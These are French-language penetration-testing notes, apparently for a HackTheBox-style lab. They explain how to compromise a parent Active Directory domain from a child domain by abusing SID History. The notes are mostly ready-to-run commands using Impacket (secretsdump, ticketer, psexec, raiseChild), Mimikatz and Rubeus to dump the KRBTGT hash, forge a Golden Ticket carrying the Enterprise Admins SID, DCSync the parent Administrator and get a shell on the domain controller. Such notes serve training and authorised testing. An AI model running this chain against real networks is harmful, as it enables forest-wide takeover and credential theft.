
> [!TIP]
> SID History attribut -> Attribut ajouté si un user est migré d'un domaine à un autre.
> ie. Si un admin du domaine est migré sur un autre domaine, son SID est sauvegardé en historique afin de toujours pouvoir accéder au premier domaine. -> Golden Ticket / DCSync ...

> [!TIP]
> Cette attaque permet de compromettre un domaine parent une fois le domaine enfant compromis grace au SidHistory correspondant au groupe "Admins d'entreprise"

Pour performer cette attaque, besoin des éléments suivants:

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.

Consiste à forger un Golden Ticket pour accéder au domaine parent 

# Depuis Linux
## Impacket

1. Récupérer le hash du compte KRBTGT

```shell
sudo impacket-secretsdump logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

2. Récupérer le SID du domaine

```shell
sudo impacket-lookupsid logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```

3. Récupérer le SID du groupe Enterprise Admins (attaché le RID du groupe au SID du domaine affiché)

```shell
sudo impacket-lookupsid logistics.inlanefreight.local/htb-student_adm@<ip_domain_parent> | grep -B12 "Enterprise Admins"
```

4. Création du golden ticket

```shell
sudo impacket-ticketer -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```

5. Injection du ticket

```shell
export KRB5CCNAME=hacker.ccache 
```

7. Obtenir un shell avec PsExec

```shell
sudo impacket-psexec LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

## Impacket-RaiseChild

Automatise tout le processus précèdent

```shell
impacket-raiseChild -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```



# Depuis Windows

## Mimikatz / Powerview

1. Récupérer le hash NT du compte KRBTGT avec Mimikatz

```powershell
lsadump::dcsync /user:LOGISTICS\krbtgt
```

2. Récupérer le SID du domaine avec PowerView

```powershell
Get-DomainSID
```

3. Récupérer le SID du groupe Enterprise Admins sur le domain cible avec Powerview

```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

4. Création du golden ticket avec Mimikatz

```powershell
kerberos::golden /user:hacker /domain:<child_domain> /sid:<sid_domain> /krbtgt:9d765b482771505cbe97411065964d5f /sids:<sid_enterprise_admins> /ptt
```

5. Valider l'injection du ticket

```powershell
klist
```

6. DCSync sur le domaine parent sur le compte Administrator

```powershell
lsadump::dcsync /user:INLANEFREIGHT\Administrator /domain:INLANEFREIGHT.LOCAL
```

7. Accéder au C$ du DC parent

```powershell
dir '\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\C$'
```

## Rubeus

Possible de forger le golden ticket avec Rubeus

```powershell
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:<child_domain> /sid:<sid_domain>  /sids:<sid_enterprise_admins> /user:hacker /ptt
```










